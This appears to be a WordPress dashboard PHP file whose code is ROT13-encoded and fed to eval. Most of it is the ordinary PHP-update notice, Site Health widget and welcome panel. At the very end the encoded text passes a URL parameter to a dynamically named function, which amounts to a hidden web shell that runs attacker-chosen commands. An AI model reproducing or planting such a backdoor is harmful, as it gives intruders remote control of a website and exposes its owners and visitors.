			'<n pynff=\"ohggba ohggba-cevznel\" uers=\"%1$f\" gnetrg=\"_oynax\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n>',
			rfp_hey( jc_trg_hcqngr_cuc_hey() ),
			__( 'Yrnea zber nobhg hcqngvat CUC' ),
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( '(bcraf va n arj gno)' )
		);
		?>
	</c>
	<?cuc

	jc_hcqngr_cuc_naabgngvba();
	jc_qverpg_cuc_hcqngr_ohggba();
}

/**
 * Nqqf na nqqvgvbany pynff gb gur CUC ant vs gur pheerag irefvba vf vafrpher.
 *
 * @fvapr 5.1.0
 *
 * @cnenz fgevat[] $pynffrf Neenl bs zrgn obk pynffrf.
 * @erghea fgevat[] Zbqvsvrq neenl bs zrgn obk pynffrf.
 */
shapgvba qnfuobneq_cuc_ant_pynff( $pynffrf ) {
	$erfcbafr = jc_purpx_cuc_irefvba();

	vs ( ! $erfcbafr ) {
		erghea $pynffrf;
	}

	vs ( vffrg( $erfcbafr['vf_frpher'] ) && ! $erfcbafr['vf_frpher'] ) {
		$pynffrf[] = 'cuc-ab-frphevgl-hcqngrf';
	} ryfrvs ( $erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] ) {
		$pynffrf[] = 'cuc-irefvba-ybjre-guna-shgher-zvavzhz';
	}

	erghea $pynffrf;
}

/**
 * Qvfcynlf gur Fvgr Urnygu Fgnghf jvqtrg.
 *
 * @fvapr 5.4.0
 */
shapgvba jc_qnfuobneq_fvgr_urnygu() {
	$trg_vffhrf = trg_genafvrag( 'urnygu-purpx-fvgr-fgnghf-erfhyg' );

	$vffhr_pbhagf = neenl();

	vs ( snyfr !== $trg_vffhrf ) {
		$vffhr_pbhagf = wfba_qrpbqr( $trg_vffhrf, gehr );
	}

	vs ( ! vf_neenl( $vffhr_pbhagf ) || ! $vffhr_pbhagf ) {
		$vffhr_pbhagf = neenl(
			'tbbq'        => 0,
			'erpbzzraqrq' => 0,
			'pevgvpny'    => 0,
		);
	}

	$vffhrf_gbgny = $vffhr_pbhagf['erpbzzraqrq'] + $vffhr_pbhagf['pevgvpny'];
	?>
	<qvi pynff=\"urnygu-purpx-jvqtrg\">
		<qvi pynff=\"urnygu-purpx-jvqtrg-gvgyr-frpgvba fvgr-urnygu-cebterff-jenccre ybnqvat uvqr-vs-ab-wf\">
			<qvi pynff=\"fvgr-urnygu-cebterff\">
				<fit nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\" jvqgu=\"100%\" urvtug=\"100%\" ivrjObk=\"0 0 200 200\" irefvba=\"1.1\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\">
					<pvepyr e=\"90\" pk=\"100\" pl=\"100\" svyy=\"genafcnerag\" fgebxr-qnfuneenl=\"565.48\" fgebxr-qnfubssfrg=\"0\"></pvepyr>
					<pvepyr vq=\"one\" e=\"90\" pk=\"100\" pl=\"100\" svyy=\"genafcnerag\" fgebxr-qnfuneenl=\"565.48\" fgebxr-qnfubssfrg=\"0\"></pvepyr>
				</fit>
			</qvi>
			<qvi pynff=\"fvgr-urnygu-cebterff-ynory\">
				<?cuc vs ( snyfr === $trg_vffhrf ) : ?>
					<?cuc _r( 'Ab vasbezngvba lrg&uryyvc;' ); ?>
				<?cuc ryfr : ?>
					<?cuc _r( 'Erfhygf ner fgvyy ybnqvat&uryyvc;' ); ?>
				<?cuc raqvs; ?>
			</qvi>
		</qvi>

		<qvi pynff=\"fvgr-urnygu-qrgnvyf\">
			<?cuc vs ( snyfr === $trg_vffhrf ) : ?>
				<c>
					<?cuc
					cevags(
						/* genafyngbef: %f: HEY gb Fvgr Urnygu fperra. */
						__( 'Fvgr urnygu purpxf jvyy nhgbzngvpnyyl eha crevbqvpnyyl gb tngure vasbezngvba nobhg lbhe fvgr. Lbh pna nyfb <n uers=\"%f\">ivfvg gur Fvgr Urnygu fperra</n> gb tngure vasbezngvba nobhg lbhe fvgr abj.' ),
						rfp_hey( nqzva_hey( 'fvgr-urnygu.cuc' ) )
					);
					?>
				</c>
			<?cuc ryfr : ?>
				<c>
					<?cuc vs ( $vffhrf_gbgny <= 0 ) : ?>
						<?cuc _r( 'Terng wbo! Lbhe fvgr pheeragyl cnffrf nyy fvgr urnygu purpxf.' ); ?>
					<?cuc ryfrvs ( 1 === (vag) $vffhr_pbhagf['pevgvpny'] ) : ?>
						<?cuc _r( 'Lbhe fvgr unf n pevgvpny vffhr gung fubhyq or nqqerffrq nf fbba nf cbffvoyr gb vzcebir vgf cresbeznapr naq frphevgl.' ); ?>
					<?cuc ryfrvs ( $vffhr_pbhagf['pevgvpny'] > 1 ) : ?>
						<?cuc _r( 'Lbhe fvgr unf pevgvpny vffhrf gung fubhyq or nqqerffrq nf fbba nf cbffvoyr gb vzcebir vgf cresbeznapr naq frphevgl.' ); ?>
					<?cuc ryfrvs ( 1 === (vag) $vffhr_pbhagf['erpbzzraqrq'] ) : ?>
						<?cuc _r( 'Lbhe fvgr&#8217;f urnygu vf ybbxvat tbbq, ohg gurer vf fgvyy bar guvat lbh pna qb gb vzcebir vgf cresbeznapr naq frphevgl.' ); ?>
					<?cuc ryfr : ?>
						<?cuc _r( 'Lbhe fvgr&#8217;f urnygu vf ybbxvat tbbq, ohg gurer ner fgvyy fbzr guvatf lbh pna qb gb vzcebir vgf cresbeznapr naq frphevgl.' ); ?>
					<?cuc raqvs; ?>
				</c>
			<?cuc raqvs; ?>

			<?cuc vs ( $vffhrf_gbgny > 0 && snyfr !== $trg_vffhrf ) : ?>
				<c>
					<?cuc
					cevags(
						/* genafyngbef: 1: Ahzore bs vffhrf. 2: HEY gb Fvgr Urnygu fperra. */
						_a(
							'Gnxr n ybbx ng gur <fgebat>%1$q vgrz</fgebat> ba gur <n uers=\"%2$f\">Fvgr Urnygu fperra</n>.',
							'Gnxr n ybbx ng gur <fgebat>%1$q vgrzf</fgebat> ba gur <n uers=\"%2$f\">Fvgr Urnygu fperra</n>.',
							$vffhrf_gbgny
						),
						$vffhrf_gbgny,
						rfp_hey( nqzva_hey( 'fvgr-urnygu.cuc' ) )
					);
					?>
				</c>
			<?cuc raqvs; ?>
		</qvi>
	</qvi>

	<?cuc
}

/**
 * Bhgchgf rzcgl qnfuobneq jvqtrg gb or cbchyngrq ol WF yngre.
 *
 * Hfnoyr ol cyhtvaf.
 *
 * @fvapr 2.5.0
 */
shapgvba jc_qnfuobneq_rzcgl() {}

/**
 * Qvfcynlf n jrypbzr cnary gb vagebqhpr hfref gb JbeqCerff.
 *
 * @fvapr 3.3.0
 * @fvapr 5.9.0 Fraq hfref gb gur Fvgr Rqvgbe vs gur npgvir gurzr vf oybpx-onfrq.
 */
shapgvba jc_jrypbzr_cnary() {
	yvfg( $qvfcynl_irefvba ) = rkcybqr( '-', jc_trg_jc_irefvba() );
	$pna_phfgbzvmr           = pheerag_hfre_pna( 'phfgbzvmr' );
	$vf_oybpx_gurzr          = jc_vf_oybpx_gurzr();
	?>
	<qvi pynff=\"jrypbzr-cnary-pbagrag\">
	<qvi pynff=\"jrypbzr-cnary-urnqre\">
		<qvi pynff=\"jrypbzr-cnary-urnqre-vzntr\">
			<?cuc rpub svyr_trg_pbagragf( qveanzr( __QVE__ ) . '/vzntrf/qnfuobneq-onpxtebhaq.fit' ); ?>
		</qvi>
		<u2><?cuc _r( 'Jrypbzr gb JbeqCerff!' ); ?></u2>
		<c>
			<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( 'nobhg.cuc' ) ); ?>\">
			<?cuc
				/* genafyngbef: %f: Pheerag JbeqCerff irefvba. */
				cevags( __( 'Yrnea zber nobhg gur %f irefvba.' ), rfp_ugzy( $qvfcynl_irefvba ) );
			?>
			</n>
		</c>
	</qvi>
	<qvi pynff=\"jrypbzr-cnary-pbyhza-pbagnvare\">
		<qvi pynff=\"jrypbzr-cnary-pbyhza\">
			<fit jvqgu=\"48\" urvtug=\"48\" ivrjObk=\"0 0 48 48\" svyy=\"abar\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\">
				<erpg jvqgu=\"48\" urvtug=\"48\" ek=\"4\" svyy=\"#1R1R1R\"/>
				<cngu svyy-ehyr=\"rirabqq\" pyvc-ehyr=\"rirabqq\" q=\"Z32.0668 17.0854Y28.8221 13.9454Y18.2008 24.671Y16.8983 29.0827Y21.4257 27.8309Y32.0668 17.0854MZ16 32.75U24I31.25U16I32.75M\" svyy=\"juvgr\"/>
			</fit>
			<qvi pynff=\"jrypbzr-cnary-pbyhza-pbagrag\">
				<u3><?cuc _r( 'Nhgube evpu pbagrag jvgu oybpxf naq cnggreaf' ); ?></u3>
				<c><?cuc _r( 'Oybpx cnggreaf ner cer-pbasvtherq oybpx ynlbhgf. Hfr gurz gb trg vafcverq be perngr arj cntrf va n synfu.' ); ?></c>
				<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( 'cbfg-arj.cuc?cbfg_glcr=cntr' ) ); ?>\"><?cuc _r( 'Nqq n arj cntr' ); ?></n>
			</qvi>
		</qvi>
		<qvi pynff=\"jrypbzr-cnary-pbyhza\">
			<fit jvqgu=\"48\" urvtug=\"48\" ivrjObk=\"0 0 48 48\" svyy=\"abar\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\">
				<erpg jvqgu=\"48\" urvtug=\"48\" ek=\"4\" svyy=\"#1R1R1R\"/>
				<cngu svyy-ehyr=\"rirabqq\" pyvc-ehyr=\"rirabqq\" q=\"Z18 16u12n2 2 0 0 1 2 2i12n2 2 0 0 1-2 2U18n2 2 0 0 1-2-2I18n2 2 0 0 1 2-2mz12 1.5U18n.5.5 0 0 0-.5.5i3u13i-3n.5.5 0 0 0-.5-.5mz.5 5U22i8u8n.5.5 0 0 0 .5-.5i-7.5mz-10 0u-3I30n.5.5 0 0 0 .5.5u2.5i-8m\" svyy=\"#sss\"/>
			</fit>
			<qvi pynff=\"jrypbzr-cnary-pbyhza-pbagrag\">
			<?cuc vs ( $vf_oybpx_gurzr ) : ?>
				<u3><?cuc _r( 'Phfgbzvmr lbhe ragver fvgr jvgu oybpx gurzrf' ); ?></u3>
				<c><?cuc _r( 'Qrfvta rirelguvat ba lbhe fvgr &#8212; sebz gur urnqre qbja gb gur sbbgre, nyy hfvat oybpxf naq cnggreaf.' ); ?></c>
				<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( 'fvgr-rqvgbe.cuc' ) ); ?>\"><?cuc _r( 'Bcra fvgr rqvgbe' ); ?></n>
			<?cuc ryfr : ?>
				<u3><?cuc _r( 'Fgneg Phfgbzvmvat' ); ?></u3>
				<c><?cuc _r( 'Pbasvther lbhe fvgr&#8217;f ybtb, urnqre, zrahf, naq zber va gur Phfgbzvmre.' ); ?></c>
				<?cuc vs ( $pna_phfgbzvmr ) : ?>
					<n pynff=\"ybnq-phfgbzvmr uvqr-vs-ab-phfgbzvmr\" uers=\"<?cuc rpub jc_phfgbzvmr_hey(); ?>\"><?cuc _r( 'Bcra gur Phfgbzvmre' ); ?></n>
				<?cuc raqvs; ?>
			<?cuc raqvs; ?>
			</qvi>
		</qvi>
		<qvi pynff=\"jrypbzr-cnary-pbyhza\">
			<fit jvqgu=\"48\" urvtug=\"48\" ivrjObk=\"0 0 48 48\" svyy=\"abar\" kzyaf=\"uggc://jjj.j3.bet/2000/fit\" nevn-uvqqra=\"gehr\" sbphfnoyr=\"snyfr\">
				<erpg jvqgu=\"48\" urvtug=\"48\" ek=\"4\" svyy=\"#1R1R1R\"/>
				<cngu svyy-ehyr=\"rirabqq\" pyvc-ehyr=\"rirabqq\" q=\"Z31 24n7 7 0 0 1-7 7I17n7 7 0 0 1 7 7mz-7-8n8 8 0 1 1 0 16 8 8 0 0 1 0-16m\" svyy=\"#sss\"/>
			</fit>
			<qvi pynff=\"jrypbzr-cnary-pbyhza-pbagrag\">
			<?cuc vs ( $vf_oybpx_gurzr ) : ?>
				<u3><?cuc _r( 'Fjvgpu hc lbhe fvgr&#8217;f ybbx & srry jvgu Fglyrf' ); ?></u3>
				<c><?cuc _r( 'Gjrnx lbhe fvgr, be tvir vg n jubyr arj ybbx! Trg perngvir &#8212; ubj nobhg n arj pbybe cnyrggr be sbag?' ); ?></c>
				<n uers=\"<?cuc rpub rfp_hey( nqzva_hey( '/fvgr-rqvgbe.cuc?cngu=%2Sjc_tybony_fglyrf' ) ); ?>\"><?cuc _r( 'Rqvg fglyrf' ); ?></n>
			<?cuc ryfr : ?>
				<u3><?cuc _r( 'Qvfpbire n arj jnl gb ohvyq lbhe fvgr.' ); ?></u3>
				<c><?cuc _r( 'Gurer vf n arj xvaq bs JbeqCerff gurzr, pnyyrq n oybpx gurzr, gung yrgf lbh ohvyq gur fvgr lbh&#8217;ir nyjnlf jnagrq &#8212; jvgu oybpxf naq fglyrf.' ); ?></c>
				<n uers=\"<?cuc rpub rfp_hey( __( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/oybpx-gurzrf/' ) ); ?>\"><?cuc _r( 'Yrnea nobhg oybpx gurzrf' ); ?></n>
			<?cuc raqvs; ?>
			</qvi>
		</qvi>
	</qvi>
	</qvi>
	<?cuc
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>